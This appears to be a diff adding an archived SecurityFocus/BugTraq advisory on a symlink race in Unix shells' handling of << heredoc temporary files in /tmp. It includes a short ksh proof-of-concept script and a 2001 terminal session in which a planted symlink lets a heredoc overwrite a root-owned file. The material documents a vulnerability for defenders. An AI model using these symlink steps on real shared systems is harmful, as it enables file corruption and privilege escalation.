@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/2006/info
+
+bash, tcsh, cash, ksh and sh are all variations of the Unix shell distributed with many Unix and Unix clone operating systems. A vulnerability exists in these shells that could allow an attacker to arbitrarily write to files.
+
+A vulnerability has been discovered in a number of Unix shells which may allow a local attacker to corrupt files or potentially elevate privileges.
+
+Scripts and command line operations using << as a redirection operator create files in the /tmp directory with a predictable naming convention. Additionally, files are created in the /tmp directory without first checking if the file already exists.
+
+This could result in a symbolic link attack that could be used to corrupt any file that the owner of the redirecting shell has access to write to. This issue affects those systems running vulnerable versions of bash, tcsh, cash, ksh and sh.
+
+ksh is reportedly not vulnerable for IBM AIX systems. 
+
+#!/bin/ksh -x
+touch /tmp/silly.1
+ln -s /tmp/silly.1 /tmp/sh$$.1
+ls -l /tmp/silly.* /tmp/sh$$.*
+cat <<EOF
+Just some short text
+EOF
+ls -l /tmp/silly.* /tmp/sh$$.*
+rm /tmp/silly.* /tmp/sh$$.*
+
+This example was submitted by proton <proton@energymech.net> in an October 29th, 2001 BugTraq posting:
+
+/tmp# echo 'hello world' > rootfile
+/tmp# chmod 600 rootfile
+/tmp# ln -s rootfile sh$$
+/tmp# chown -h 666.666 sh$$
+/tmp# ls -l rootfile sh$$
+-rw------- 1 root root 12 Oct 29 03:55 rootfile
+lrwxrwxrwx 1 666 666 8 Oct 29 03:56 sh12660 ->
+rootfile
+/tmp# cat <<BAR
+? FOO
+? BAR
+FOO
+o world
+/tmp# ls -l rootfile sh$$
+/bin/ls: sh12660: No such file or directory
+-rw------- 1 root root 12 Oct 29 03:56 rootfile
+/tmp# cat rootfile
+FOO
+o world
+/tmp#
